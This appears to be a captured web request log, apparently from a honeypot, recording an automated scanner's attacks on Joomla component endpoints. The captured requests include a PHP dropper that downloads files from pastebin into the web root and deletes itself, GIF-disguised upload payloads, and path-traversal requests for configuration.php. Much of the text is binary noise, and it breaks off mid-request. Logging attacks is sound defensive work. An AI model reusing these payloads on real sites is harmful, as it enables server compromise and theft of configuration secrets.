":"","`":"","\u0010":"","P":"","\u0002\u0013\u0011\u00131\u0013\t\u0013)\u0013\u0019��I�I�I�I�I�e�i�fL�[[�_\u00180�1��8S|5��t��\u001bgJ�'ˬ�\n":"�\u001e���9\n�q����d�TK�se��6+���s�o��m�\u0014zV�n���E�����Qe��«�D[���\u0001���\u001d徥^E^�E�����\u0007���Um�����\u000e�\u0010\u0003n֞��B�o�\"�\u000b��\r=������k��\u001f\u001au�!�*#��3���A�C�qV��gMh��c����)�g,n�\u0018�y\u0014t|�UkӪ�\u0017�L�|����\u001a�.=���_[\r��Gp\u001dٴ�/K��.��±�%ô2}(�a�\u001f'�\u001f.\r���Tg[�2�J�y�s�r�=���\u0004��4�N\u0019���}_���E��Š�\u000f)7��L\b��\u001d%35v�|��\u001aҴ�_","\u0013�\u0006օk$�_���w\u001b�����\u001a�\u001d��u�ӑ�m_\u0017�5�\b��k�'���\u0007S\rJ����T�V�]5Ȅ\u0002�\u0015G�\\f�L��'�3��db dϞ�l�~S���ednO��B(U�4\\Y�\u001cӷ C��ȦiiF9�K\u0014G\"�lv)�j�o�K�N7�߿e큤#��#e\u0013c'|s��5�/v\nk�k\"�ӹ":"L�;U\u0015>�Z��\u0013_�\u000eͷ*Kr�˳�vk\u0002p�1��,wCis����^^�rN\u001e���X�Ü�q�","�(�":"�W��.�5j\f~��[~�Hs'���o>l��1KYu��YY/]4?\b�2���>��N�-7\u0016X\u0016\u0016��Ū��� B�\u0017\u0015\u0018��\u001d���{�R�f�]Ce�zkIw�H��֋FF{","\u001c͙�\u0014Z�lt���,s<X\u0011�����Lug)��f���\\[\u0017�\u001b��F;\u001f\n��^���":"","�$B>�Y����:�i�*�Dw]�\fQׯ��9F�\t�z�1O�O�":"�\u000f��RNȨ^�K������\u001c*�6�b��ђ-b�y�I��m�\u0003��o�xR���6�=,���\u0015��U\rc�yo�SՆ�Ο��\u000f��yn\u000f ��Z��\u001dw������Q'�^�|� �RN|^��OmϪ��.-������F�5�^i�nuʽ�-�#Ѹ�f���]�\u0011�)��\"�VԞw��9�N�����A�\r�ҽ�s��̍I^ߺ4X�\u0004�\u000e[�.�9ew�஥r���G�N�W�sc\u001e�L?��ZF�u���� t��\u001fꋔ�'��\fΎyhqǢ���E/����\u001e\u00044�ʀ�\tѺq�{\r̫\u001f�~�4���S˾\u0017��\n�j]��!6/@y ","3ڤ�Ŵ��\u000b?��\u0016\u001e��;\\\u0017��\u0018�}5��п�M������5�\u0016Β�D��\\\u0019���s�.��\r'�\u0017Z�ئ̢鑹�XĽ�w����\u001b�����~�)���*����@Gw^[Q��\u0010�`��o��\u000f׍�e\u0019�ύ�?wu1;��Jt޸ײ��|��u3\u001e\u0014�,�����\u0000�R�t�)tٴ\t���W^ɍG칶�u�X\u0013Ǭ\u0016��zN�:�8\u0007�)_���J�|{�\u001b��P{�?�w�}O\u000b'�[��X�u�v99�!�3��Bg��5n�-���6�ߟ��^�y�np^ٝ�x�)��C�o�h~\u001dXR\u0011��'/ɥ�":"","*�lVu�o��Q����n�i�;MK:v�ޗ�;��q���\u001c\n��y�ҥS����OH��Z�w,勳�\r��ǖ�\r�3L�u�1��xT\u0016]�������eo\u000f�j�\u0003G�$C\u0007�M\u000bv��O\fm�q�:�q����ӛ�N.鎻�W����>�V�;e�\u0004�X���W3�����M϶W���lO�y�u�_N^aؼ�\u000b6Aa�J��Z��B�ӳ\u0017�X\u00059���� �gAF����7��":"","lmo�\fWUv7��p�9V/�U\u0011��1��a�":"���\u0019�.�P:�?9h,�9�n���\u0003;�����aˉS�%Fɶ\u0005��|�*~��gTծ\u0016��\u0005\u0003?�.���w���K\u0003\r�Ӫ�<�~��k��[U�\r�|4�q�\n�>#�˧�3�\u000f�\u0006��$��=�\u000bWO�с��\u0000PK\u0001\u0002\u001f\u0000\u0014\u0000\u0000\u0000\b\u0000H�lL�\u0015.\u0004\u0002\t\u0000\u0000�\t\u0000\u0000\u0007\u0000$\u0000\u0000\u0000\u0000\u0000\u0000\u0000 \u0000\u0000\u0000\u0000\u0000\u0000\u0000pwn.gif\n\u0000 \u0000\u0000\u0000\u0000\u0000\u0001\u0000\u0018\u0000K�\u0011�\u001c��\u0001�S\u0000�\u001c��\u0001�S\u0000�\u001c��\u0001PK\u0005\u0006\u0000\u0000\u0000\u0000\u0001\u0000\u0001\u0000Y\u0000\u0000\u0000'\t\u0000\u0000\u0000\u0000\r\n--7cf1b0f04de3ac17609a925c133c24f5\r\nContent-Disposition: form-data; name=\"pic_upload\"; filename=\"files/vuln.php3.j\"\r\nContent-Type: multipart/form-data\r\n\r\n<title>Vuln!! patch it Now!</title>\r\n<?php\r\nfunction http_get($url){\r\n\t$im = curl_init($url);\r\n\tcurl_setopt($im, CURLOPT_RETURNTRANSFER, 1);\r\n\tcurl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);\r\n\tcurl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);\r\n\tcurl_setopt($im, CURLOPT_HEADER, 0);\r\n\treturn curl_exec($im);\r\n\tcurl_close($im);\r\n}\r\n$check = $_SERVER['DOCUMENT_ROOT'] . \"/images/vuln.php\" ;\r\n$text = http_get('https://pastebin.com/raw/phAM8DFH');\r\n$open = fopen($check, 'w');\r\nfwrite($open, $text);\r\nfclose($open);\r\nif(file_exists($check)){\r\n    echo $check.\"</br>\";\r\n}else \r\n  echo \"not exits\";\r\necho \"done .\\n \" ;\r\n\r\n$check2 = $_SERVER['DOCUMENT_ROOT'] . \"/vuln.htm\" ;\r\n$text2 = http_get('https://pastebin.com/raw/880ufaWF');\r\n$open2 = fopen($check2, 'w');\r\nfwrite($open2, $text2);\r\nfclose($open2);\r\nif(file_exists($check2)){\r\n    echo $check2.\"</br>\";\r\n}else \r\n  echo \"not exits\";\r\necho \"done .\\n \" ;\r\n\r\n@unlink(__FILE__);\r\n?>\r\n\r\n--7cf1b0f04de3ac17609a925c133c24f5--\r\n"}
+**END SECURE REQUEST
+========= REQ #94==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.php?option=com_jdownloads&Itemid=0&view=upload
+2019:08:01:11:55:47
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "6250"
+}
+::ffff:46.105.99.212
+{}
+{"0":"","--f1487ecfc8ed30b9371ff4b39201eab2\r\nContent-Disposition: form-data; name":"\"catlist\"\r\n\r\n1\r\n--f1487ecfc8ed30b9371ff4b39201eab2\r\nContent-Disposition: form-data; name=\"view\"\r\n\r\nupload\r\n--f1487ecfc8ed30b9371ff4b39201eab2\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nur name\r\n--f1487ecfc8ed30b9371ff4b39201eab2\r\nContent-Disposition: form-data; name=\"option\"\r\n\r\ncom_jdownloads\r\n--f1487ecfc8ed30b9371ff4b39201eab2\r\nContent-Disposition: form-data; name=\"filetitle\"\r\n\r\nlolz\r\n--f1487ecfc8ed30b9371ff4b39201eab2\r\nContent-Disposition: form-data; name=\"mail\"\r\n\r\nTTTnstT@aa.com\r\n--f1487ecfc8ed30b9371ff4b39201eab2\r\nContent-Disposition: form-data; name=\"send\"\r\n\r\n1\r\n--f1487ecfc8ed30b9371ff4b39201eab2\r\nContent-Disposition: form-data; name=\"senden\"\r\n\r\nSend file\r\n--f1487ecfc8ed30b9371ff4b39201eab2\r\nContent-Disposition: form-data; name=\"2d1a8f3bd0b5cf542e9312d74fc9766f\"\r\n\r\n1\r\n--f1487ecfc8ed30b9371ff4b39201eab2\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\n<p>qsdqsdqsdqsdqsdqsdqsd</p>\r\n--f1487ecfc8ed30b9371ff4b39201eab2\r\nContent-Disposition: form-data; name=\"file_upload\"; filename=\"files/jdownlods.zip\"\r\nContent-Type: multipart/form-data\r\n\r\nPK\u0003\u0004\u0014\u0000\u0000\u0000\b\u0000H�lL�\u0015.\u0004\u0002\t\u0000\u0000�\t\u0000\u0000\u0007\u0000\u0000\u0000pwn.gifMR{\\��\u0016^M��n'��q�%���E��߮�Ω�瞔z��\nS�\u0019_e4E�t{���\u001d�\u0014J��Д����\u001bjB�0bb��8�;����k���~k��y������ s\u001dw�\u0002���\b\u001d���-\f����M\u0000\u0001`\u0000\u0002@\u0001\u0018p\u0000\u001c\u0002\u000e\u0003G���1�\u0001x\u0004<\u0006�\u0000O�g \u0000\b\b\u0004\f\u0002\u0001���@\u0004\u0010\u0011�\u0018D\u0002\"\u0005��\u0004 !�0H\u0004$\n\u0012\u001b�\r\f\u0001��\b0\n�!�n�\u0000# \b�0�8@\u001cB\u001cF\u001cA\u001cE\u001cC< \u001e!\u001e#� �\"�!\u0001�����@�@���\bHDH�H$H�HdH\u0002$!$a$\u0011$Q$1�\u00001�\u0018F� F\u0011cXK\u001ba�\u0018\b\u0006:|\u0016�\u0000s\bs\u0018s\u0004s\u0014s\f�y�y�y�y�y�\u0005�\u0002�\u0002�\u0002�\u0002�\u0002�\"`\u0011a\u0011c�`�b�a\t�����D�D��0\u0003�\u0010f\u00183�\u0019Ō\u0011��\u0000","@\b�aE\b\u0007�C�Ä#���c�\u0007�#�c�\u0013�S�3\"\u0000\u0011\u0010\u00110\u0011\b\u0011(\u0011\u0018\u0011�����������H@$D$L$B$J$F\u0018\u0010�\bÄ\u0011�(a�j�F\u00140\u0005B�\u000e�A9�\u001c�\u001c�\u001c�\u001c�\u001c�<P\u001eQ\u001eS�P�R�Q\u0001�����@�@���\bTDT�T$T�TdT\u0002*!*a*\u0011*Q*1ʀ2D\u0019��PF)c�G\u0000��\u0004�\u0016\u001c~\u0005\u000e\u0018�\u0018�\u0019G\u0018G\u0019�\u0018\u000f�G�ǌ'���gL\u0000":""," ":"","`":"","\u0010":"","P":"","\u0002\u0013\u0011\u00131\u0013\t\u0013)\u0013\u0019��I�I�I�I�I�e�i�fL�[[�_\u00180�1��8S|5��t��\u001bgJ�'ˬ�\n":"�\u001e���9\n�q����d�TK�se��6+���s�o��m�\u0014zV�n���E�����Qe��«�D[���\u0001���\u001d徥^E^�E�����\u0007���Um�����\u000e�\u0010\u0003n֞��B�o�\"�\u000b��\r=������k��\u001f\u001au�!�*#��3���A�C�qV��gMh��c����)�g,n�\u0018�y\u0014t|�UkӪ�\u0017�L�|����\u001a�.=���_[\r��Gp\u001dٴ�/K��.��±�%ô2}(�a�\u001f'�\u001f.\r���Tg[�2�J�y�s�r�=���\u0004��4�N\u0019���}_���E��Š�\u000f)7��L\b��\u001d%35v�|��\u001aҴ�_","\u0013�\u0006օk$�_���w\u001b�����\u001a�\u001d��u�ӑ�m_\u0017�5�\b��k�'���\u0007S\rJ����T�V�]5Ȅ\u0002�\u0015G�\\f�L��'�3��db dϞ�l�~S���ednO��B(U�4\\Y�\u001cӷ C��ȦiiF9�K\u0014G\"�lv)�j�o�K�N7�߿e큤#��#e\u0013c'|s��5�/v\nk�k\"�ӹ":"L�;U\u0015>�Z��\u0013_�\u000eͷ*Kr�˳�vk\u0002p�1��,wCis����^^�rN\u001e���X�Ü�q�","�(�":"�W��.�5j\f~��[~�Hs'���o>l��1KYu��YY/]4?\b�2���>��N�-7\u0016X\u0016\u0016��Ū��� B�\u0017\u0015\u0018��\u001d���{�R�f�]Ce�zkIw�H��֋FF{","\u001c͙�\u0014Z�lt���,s<X\u0011�����Lug)��f���\\[\u0017�\u001b��F;\u001f\n��^���":"","�$B>�Y����:�i�*�Dw]�\fQׯ��9F�\t�z�1O�O�":"�\u000f��RNȨ^�K������\u001c*�6�b��ђ-b�y�I��m�\u0003��o�xR���6�=,���\u0015��U\rc�yo�SՆ�Ο��\u000f��yn\u000f ��Z��\u001dw������Q'�^�|� �RN|^��OmϪ��.-������F�5�^i�nuʽ�-�#Ѹ�f���]�\u0011�)��\"�VԞw��9�N�����A�\r�ҽ�s��̍I^ߺ4X�\u0004�\u000e[�.�9ew�஥r���G�N�W�sc\u001e�L?��ZF�u���� t��\u001fꋔ�'��\fΎyhqǢ���E/����\u001e\u00044�ʀ�\tѺq�{\r̫\u001f�~�4���S˾\u0017��\n�j]��!6/@y ","3ڤ�Ŵ��\u000b?��\u0016\u001e��;\\\u0017��\u0018�}5��п�M������5�\u0016Β�D��\\\u0019���s�.��\r'�\u0017Z�ئ̢鑹�XĽ�w����\u001b�����~�)���*����@Gw^[Q��\u0010�`��o��\u000f׍�e\u0019�ύ�?wu1;��Jt޸ײ��|��u3\u001e\u0014�,�����\u0000�R�t�)tٴ\t���W^ɍG칶�u�X\u0013Ǭ\u0016��zN�:�8\u0007�)_���J�|{�\u001b��P{�?�w�}O\u000b'�[��X�u�v99�!�3��Bg��5n�-���6�ߟ��^�y�np^ٝ�x�)��C�o�h~\u001dXR\u0011��'/ɥ�":"","*�lVu�o��Q����n�i�;MK:v�ޗ�;��q���\u001c\n��y�ҥS����OH��Z�w,勳�\r��ǖ�\r�3L�u�1��xT\u0016]�������eo\u000f�j�\u0003G�$C\u0007�M\u000bv��O\fm�q�:�q����ӛ�N.鎻�W����>�V�;e�\u0004�X���W3�����M϶W���lO�y�u�_N^aؼ�\u000b6Aa�J��Z��B�ӳ\u0017�X\u00059���� �gAF����7��":"","lmo�\fWUv7��p�9V/�U\u0011��1��a�":"���\u0019�.�P:�?9h,�9�n���\u0003;�����aˉS�%Fɶ\u0005��|�*~��gTծ\u0016��\u0005\u0003?�.���w���K\u0003\r�Ӫ�<�~��k��[U�\r�|4�q�\n�>#�˧�3�\u000f�\u0006��$��=�\u000bWO�с��\u0000PK\u0001\u0002\u001f\u0000\u0014\u0000\u0000\u0000\b\u0000H�lL�\u0015.\u0004\u0002\t\u0000\u0000�\t\u0000\u0000\u0007\u0000$\u0000\u0000\u0000\u0000\u0000\u0000\u0000 \u0000\u0000\u0000\u0000\u0000\u0000\u0000pwn.gif\n\u0000 \u0000\u0000\u0000\u0000\u0000\u0001\u0000\u0018\u0000K�\u0011�\u001c��\u0001�S\u0000�\u001c��\u0001�S\u0000�\u001c��\u0001PK\u0005\u0006\u0000\u0000\u0000\u0000\u0001\u0000\u0001\u0000Y\u0000\u0000\u0000'\t\u0000\u0000\u0000\u0000\r\n--f1487ecfc8ed30b9371ff4b39201eab2\r\nContent-Disposition: form-data; name=\"pic_upload\"; filename=\"files/pwn.gif\"\r\nContent-Type: multipart/form-data\r\n\r\nGIF89a\u0018\u0001G\u0000p\u0000\u0000!�\u0004\u0001\u0000\u0000�\u0000,\u0000\u0000\u0000\u0000\u0018\u0001G\u0000�\u0000\u0000\u0000\u0000\u00003\u0000\u0000f\u0000\u0000�\u0000\u0000�\u0000\u0000�\u0000+\u0000\u0000+3\u0000+f\u0000+�\u0000+�\u0000+�\u0000U\u0000\u0000U3\u0000Uf\u0000U�\u0000U�\u0000U�\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000ՙ\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��3\u0000\u00003\u000033\u0000f3\u0000�3\u0000�3\u0000�3+\u00003+33+f3+�3+�3+�3U\u00003U33Uf3U�3U�3U�3�\u00003�33�f3��3��3��3�\u00003�33�f3��3��3��3�\u00003�33�f3ՙ3��3��3�\u00003�33�f3��3��3��f\u0000\u0000f\u00003f\u0000ff\u0000�f\u0000�f\u0000�f+\u0000f+3f+ff+�f+�f+�fU\u0000fU3fUffU�fU�fU�f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ffՙf��f��f�\u0000f�3f�ff��f��f���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000̙\u0000��+\u0000�+3�+f�+��+̙+��U\u0000�U3�Uf�U��U̙U���\u0000��3��f�����̙����\u0000��3��f�����̙����\u0000��3��f�ՙ��̙����\u0000��3��f�����̙���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000��+\u0000�+3�+f�+��+��+��U\u0000�U3�Uf�U��U��U�̀\u0000̀3̀f̀�̀�̀�̪\u0000̪3̪f̪�̪�̪���\u0000��3��f�ՙ��������\u0000��3��f����������\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000��+\u0000�+3�+f�+��+��+��U\u0000�U3�Uf�U��U��U���\u0000��3��f�����������\u0000��3��f�����������\u0000��3��f�ՙ��������\u0000��3��f���������\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b�\u0000\u0001\b\u001cH����\b\u0013*\\Ȱ�Ç\u0010#J�H��ŋ\u00183j�ȱ�Ǐ C�\u001cI��ɓ(S�\\ɲ�˗0cʜI��͛8s��ɳ�ϟ@�\n\u001dJ��ѣH�*]ʴ�ӧP�J�J��իX�j�ʵ�ׯ`Ê\u001dK��ٳhӪ]˶�۷p�ʝK��\u0003e��\u0002\u0011�Bk\u0000P�\u0006�\r�2�\"��\u0013\u0002Qv�a\u000ee�+\"\u0000ELYeb���D�l����)>�����a�;\"��W���","\u001f'��q�2�\u0005\u001dT���\b1a\u0017m Ӕ���\u0001�0�(\u001b7�ǐ\u0013���q2l�G�E]p1oɔ\u001b\u0013�L�\f6C5� >H\u0006\\�_�\u0011�C$\u000fF����\u0015��,��\u0000ʘd�\u0011v��b^Kp\u0010\u0013\fF�}7�d�D�\u0010\u0010�\u0005�[j��\u0012Q�\u000b>�^\u0017q��h�e��\u000f�\t��k��\b�b�U�؁\u0000<���\b�\u0017�D�\u001d8Z�\u0010�\b�\u0000�(S�FB*�\u001ef\u0017\u001e�\u0018w\u001e\u0011\b��.-�\u000bB��n�\t���\u0003\u001d��@V\nV�@\u000f�x�\u0003�\t�":"","�\u000b��\u001d�m$gB�%#\u0006(x\u001d�\u0003qTT�Z����\u0018o\u0010\u001aw\u0019u�U�\f1�8h�\u0011\u00124�rh��%�j$#�@y��Xe�\"��2\u0012\u0012��{�]fb�LZ��^����_��U��A�\u0016�ꢻޕ�\u0016�\u0019�\u001dn�UV�{�,\u000b�b�":"F��\t\u00188�G�u�^q�\u0015�W��-��B���di94�,1��:�0i�:\u001c��*\u0003f��>جe�<�\f\u0015\u0001\u0014�(����_g��\n@��l��p\tKjи\u000b\u000b|\u0019��\u001a�e�@�G\u0010��M7��]N�\u0018���٣f��\u000b��ƶ�]{\u0000�%qA�e\u0012�u(�\u0011m\u0012�I���\nɔ�9WP�G\u0003@)�\u0003Q��c4\u000bT��\u0005�v䳭�'�0���\u0010�\u0005]�3B������}���(\u000bDi�еG\u001eowќ�Iw����@��,]�hb�ܝS�G��\u000f\u0012���\n,A�����T�Fޮ\u000b\"��y��7��\r�kEƸ�q��z��\u0001����\u0005�:m+\u0017.xGY�J91@\n�X����'o3\u0016��0�X�,m�w�oQS��A蕨ɍΗJ���\u0003_�\u0003�t9i�`�J}B�\u001b�_�h[[oƉ{��xE\u0012\u001d�{��\u0019z�z+\u000f�d'����\u000e�ڍCf����n ���@\u0012���.v�\u001b�\u001b�<��rY+�]�W�\u0000؁q\u0003y��\b\u0018�ݭ�5��Ɋ���=pap�Dc2w�]@�v�q\u0011��v�\u0011�vU\u001bH��sC<�L\u000byR\u001a�\nT��\u0001�T���ƣ�-\u0012do\u0004�Vw�7Abx1jĹ^�ا�#v,�-̎o�3�\u001by�zF�\u001d\u0000�`��,\"K�\u0012�H��#�lL\u001d3�t�S���o:nKPd\f��\f\u0012����\f\f\u001fCB\u0015�ʒ�A`\u001c�,\u0018\u001a\u0004��)ݚ*��؅�]T\u0010@\u001d8��eM","\u0019U�ÿ�\u0012\f\u0004|�rC$\u0014\u00117��\u0010B�4�[\by2Q$/\u0006�R�8Nr��\u001d\u0014e1�\u0006)�A��\u001ef�c�\"F�\u000eB��H\u0010Km4\u00168�ٶ�YF\u0012�i \u0005�g9�����I�0�6���`fg�1g�\u001c�5S��_��b�|��B�Gvpd\u0015-��P�\\\r�\u0000`�0>�":"","bt\u0013��t\u000e���%��P�":{"2�i4��\u0001�r��Ld��fQ��/�b����E�\n~\n�P2v\u00150�H���\u0012O�TE\f�M�\u0010�\f_\u000eV����\u0013�{\u0018�\u001ae�)��z�d#N�z�ca�D�y�Q�7��8t1_͔�@�\u0019\u0012\u0014\u001d1s�)��\u0012F�\u0013�ү�L�r�*�C�Q���h6e�(ah¡5B,\u001c\u0006f�T�.;(\"aA���":""}}
+**END SECURE REQUEST
+========= REQ #95==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php
+2019:08:01:11:55:57
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #96==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.php?option=com_myblog&task=ajaxupload
+2019:08:01:11:56:04
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "2616"
+}
+::ffff:46.105.99.212
+{}
+{"--261db808dc97fbdc9db1f511332ad767\r\nContent-Disposition: form-data; name":"\"fileToUpload\"; filename=\"pwn.gif\"\r\n\r\nGIF89a\u0018\u0001G\u0000p\u0000\u0000!�\u0004\u0001\u0000\u0000�\u0000,\u0000\u0000\u0000\u0000\u0018\u0001G\u0000�\u0000\u0000\u0000\u0000\u00003\u0000\u0000f\u0000\u0000�\u0000\u0000�\u0000\u0000�\u0000 \u0000\u0000 3\u0000 f\u0000 �\u0000 �\u0000 �\u0000U\u0000\u0000U3\u0000Uf\u0000U�\u0000U�\u0000U�\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000ՙ\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��3\u0000\u00003\u000033\u0000f3\u0000�3\u0000�3\u0000�3 \u00003 33 f3 �3 �3 �3U\u00003U33Uf3U�3U�3U�3�\u00003�33�f3��3��3��3�\u00003�33�f3��3��3��3�\u00003�33�f3ՙ3��3��3�\u00003�33�f3��3��3��f\u0000\u0000f\u00003f\u0000ff\u0000�f\u0000�f\u0000�f \u0000f 3f ff �f �f �fU\u0000fU3fUffU�fU�fU�f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ffՙf��f��f�\u0000f�3f�ff��f��f���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000̙\u0000�� \u0000� 3� f� �� ̙ ��U\u0000�U3�Uf�U��U̙U���\u0000��3��f�����̙����\u0000��3��f�����̙����\u0000��3��f�ՙ��̙����\u0000��3��f�����̙���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U�̀\u0000̀3̀f̀�̀�̀�̪\u0000̪3̪f̪�̪�̪���\u0000��3��f�ՙ��������\u0000��3��f����������\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U���\u0000��3��f�����������\u0000��3��f�����������\u0000��3��f�ՙ��������\u0000��3��f���������\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b�\u0000\u0001\b\u001cH����\b\u0013*\\Ȱ�Ç\u0010#J�H��ŋ\u00183j�ȱ�Ǐ C�\u001cI��ɓ(S�\\ɲ�˗0cʜI��͛8s��ɳ�ϟ@�\n\u001dJ��ѣH�*]ʴ�ӧP�J�J��իX�j�ʵ�ׯ`Ê\u001dK��ٳhӪ]˶�۷p�ʝK��\u0003e��\u0002\u0011�Bk\u0000P�\u0006�\r�2�\"��\u0013\u0002Qv�a\u000ee� \"\u0000ELYeb���D�l����)>�����a�;\"��W���","\u001f'��q�2�\u0005\u001dT���\b1a\u0017m Ӕ���\u0001�0�(\u001b7�ǐ\u0013���q2l�G�E]p1oɔ\u001b\u0013�L�\f6C5� >H\u0006\\�_�\u0011�C$\u000fF����\u0015��,��\u0000ʘd�\u0011v��b^Kp\u0010\u0013\fF�}7�d�D�\u0010\u0010�\u0005�[j��\u0012Q�\u000b>�^\u0017q��h�e��\u000f�\t��k��\b�b�U�؁\u0000<���\b�\u0017�D�\u001d8Z�\u0010�\b�\u0000�(S�FB*�\u001ef\u0017\u001e�\u0018w\u001e\u0011\b��.-�\u000bB��n�\t���\u0003\u001d��@V\nV�@\u000f�x�\u0003�\t�":"","�\u000b��\u001d�m$gB�%#\u0006(x\u001d�\u0003qTT�Z����\u0018o\u0010\u001aw\u0019u�U�\f1�8h�\u0011\u00124�rh��%�j$#�@y��Xe�\"��2\u0012\u0012��{�]fb�LZ��^����_��U��A�\u0016�ꢻޕ�\u0016�\u0019�\u001dn�UV�{�,\u000b�b�":"F��\t\u00188�G�u�^q�\u0015�W��-��B���di94�,1��:�0i�:\u001c��*\u0003f��>جe�<�\f\u0015\u0001\u0014�(����_g��\n@��l��p\tKjи\u000b\u000b|\u0019��\u001a�e�@�G\u0010��M7��]N�\u0018���٣f��\u000b��ƶ�]{\u0000�%qA�e\u0012�u(�\u0011m\u0012�I���\nɔ�9WP�G\u0003@)�\u0003Q��c4\u000bT��\u0005�v䳭�'�0���\u0010�\u0005]�3B������}���(\u000bDi�еG\u001eowќ�Iw����@��,]�hb�ܝS�G��\u000f\u0012���\n,A�����T�Fޮ\u000b\"��y��7��\r�kEƸ�q��z��\u0001����\u0005�:m+\u0017.xGY�J91@\n�X����'o3\u0016��0�X�,m�w�oQS��A蕨ɍΗJ���\u0003_�\u0003�t9i�`�J}B�\u001b�_�h[[oƉ{��xE\u0012\u001d�{��\u0019z�z+\u000f�d'����\u000e�ڍCf����n ���@\u0012���.v�\u001b�\u001b�<��rY+�]�W�\u0000؁q\u0003y��\b\u0018�ݭ�5��Ɋ���=pap�Dc2w�]@�v�q\u0011��v�\u0011�vU\u001bH��sC<�L\u000byR\u001a�\nT��\u0001�T���ƣ�-\u0012do\u0004�Vw�7Abx1jĹ^�ا�#v,�-̎o�3�\u001by�zF�\u001d\u0000�`��,\"K�\u0012�H��#�lL\u001d3�t�S���o:nKPd\f��\f\u0012����\f\f\u001fCB\u0015�ʒ�A`\u001c�,\u0018\u001a\u0004��)ݚ*��؅�]T\u0010@\u001d8��eM","\u0019U�ÿ�\u0012\f\u0004|�rC$\u0014\u00117��\u0010B�4�[\by2Q$/\u0006�R�8Nr��\u001d\u0014e1�\u0006)�A��\u001ef�c�\"F�\u000eB��H\u0010Km4\u00168�ٶ�YF\u0012�i \u0005�g9�����I�0�6���`fg�1g�\u001c�5S��_��b�|��B�Gvpd\u0015-��P�\\\r�\u0000`�0>�":"","bt\u0013��t\u000e���%��P�":{"2�i4��\u0001�r��Ld��fQ��/�b����E�\n~\n�P2v\u00150�H���\u0012O�TE\f�M�\u0010�\f_\u000eV����\u0013�{\u0018�\u001ae�)��z�d#N�z�ca�D�y�Q�7��8t1_͔�@�\u0019\u0012\u0014\u001d1s�)��\u0012F�\u0013�ү�L�r�*�C�Q���h6e�(ah¡5B,\u001c\u0006f�T�.;(\"aA���":""}}
+**END SECURE REQUEST
+========= REQ #97==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/images/pwn.gif
+2019:08:01:11:56:10
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #98==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.php?option=com_macgallery&view=download&albumid=../../configuration.php
+2019:08:01:11:56:20
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #99==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form
+2019:08:01:11:56:33
+POST
+{
+  "host": "github.davidthats.me",
